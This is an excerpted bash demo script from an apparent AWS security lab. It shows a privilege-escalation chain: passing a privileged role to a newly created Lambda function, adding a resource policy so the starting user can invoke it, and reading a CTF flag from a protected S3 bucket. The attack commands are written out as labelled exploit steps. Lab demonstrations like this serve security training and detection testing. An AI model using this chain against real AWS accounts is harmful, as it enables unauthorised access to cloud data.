...
# Demo script for iam:PassRole + lambda:CreateFunction + lambda:AddPermission to S3 bucket access
# This scenario demonstrates how a user with PassRole, CreateFunction, and AddPermission can
# pass a privileged role to a Lambda function, grant themselves invoke access via a resource-based
# policy, and use the function to read from a sensitive S3 bucket.
...
# Configuration
STARTING_USER="pl-prod-lambda-006-to-bucket-starting-user"
TARGET_ROLE="pl-prod-lambda-006-to-bucket-target-role"
LAMBDA_FUNCTION_NAME="pl-lambda-006-to-bucket-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + AddPermission to S3 Bucket Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"
...
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_006_iam_passrole_lambda_createfunction_lambda_addpermission.value // empty')
...
# [EXPLOIT] Step 4: Verify we don't have access to the target bucket yet
...
echo -e "${YELLOW}Step 5: Preparing Lambda function to read the S3 bucket${NC}"
...
show_attack_cmd "Attacker" "aws lambda create-function --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --runtime python3.12 --role $TARGET_ROLE_ARN --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --environment Variables={TARGET_BUCKET=$TARGET_BUCKET} --timeout 30 --output json"
...
if [ $? -eq 0 ]; then
    ...
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-006-to-bucket-response.json
    exit 1
fi
echo ""
...
# [EXPLOIT] Step 8: Add resource-based policy to allow starting user to invoke the function
echo -e "${YELLOW}Step 8: Adding invoke permission via resource-based policy (AddPermission)${NC}"
echo "Unlike lambda:InvokeFunction alone, creating a function does not automatically grant the"
echo "creator invoke access. lambda:AddPermission is required to explicitly allow invocation..."

STATEMENT_ID="allow-self-$(date +%s)"
STARTING_USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
echo "Adding permission for: $STARTING_USER_ARN"

show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --statement-id $STATEMENT_ID --action lambda:InvokeFunction --principal $STARTING_USER_ARN --output json"
...
if [ $? -eq 0 ]; then
    ...
    echo -e "${RED}Error: Failed to add invoke permission${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-006-to-bucket-response.json
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Invoke the Lambda function to read the flag from S3
echo -e "${YELLOW}Step 9: Invoking Lambda function to read flag from target S3 bucket${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Invoking function: $LAMBDA_FUNCTION_NAME"

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --payload '{}' /tmp/lambda-006-to-bucket-response.json --output json"
aws lambda invoke \
    --region "$AWS_REGION" \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --payload '{}' \
    /tmp/lambda-006-to-bucket-response.json \
    --output json > /dev/null
...
if [ $? -eq 0 ]; then
    ...
    cat /tmp/lambda-006-to-bucket-response.json | jq '.'
    echo ""
else
...
# [EXPLOIT] Step 10: Parse Lambda response and capture the CTF flag
echo -e "${YELLOW}Step 10: Capturing CTF flag from Lambda response${NC}"

# Parse the nested JSON response body
RESPONSE_BODY=$(cat /tmp/lambda-006-to-bucket-response.json | jq -r '.body' 2>/dev/null)

if [ -z "$RESPONSE_BODY" ] || [ "$RESPONSE_BODY" = "null" ]; then
    echo -e "${RED}Error: Could not extract response body from Lambda${NC}"
    echo "Raw response:"
    cat /tmp/lambda-006-to-bucket-response.json
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-006-to-bucket-response.json
    exit 1
fi
...
echo "2. Created Lambda function and passed $TARGET_ROLE to it (target role has s3:GetObject on bucket)"
echo "3. Used lambda:AddPermission to add a resource-based policy allowing the starting user to invoke"
echo "4. Invoked Lambda function, which read flag.txt from $TARGET_BUCKET using the target role"
echo "5. Extracted CTF flag from Lambda response: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (iam:PassRole + lambda:CreateFunction) → Lambda with $TARGET_ROLE"
echo "  → (lambda:AddPermission) → Allow self-invoke → (lambda:InvokeFunction) → s3:GetObject flag.txt → CTF Flag"
